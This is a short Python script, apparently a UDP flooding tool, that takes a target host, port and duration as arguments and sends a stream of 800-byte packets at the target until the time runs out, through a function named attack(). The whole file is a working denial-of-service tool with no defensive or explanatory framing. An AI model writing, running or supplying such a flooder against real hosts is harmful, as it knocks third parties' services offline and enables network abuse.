import sys
import socket
import threading
import time


host = str(sys.argv[1])
port = int(sys.argv[2])
second = int(sys.argv[3])

def send_packet(amplifier):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.connect((host, port))

    t_end = time.time() + second
    while time.time() < t_end:
        s.send(b"\x99" * amplifier)

def attack():
    threading.Thread(target=send_packet(800), daemon=True).start()


attack()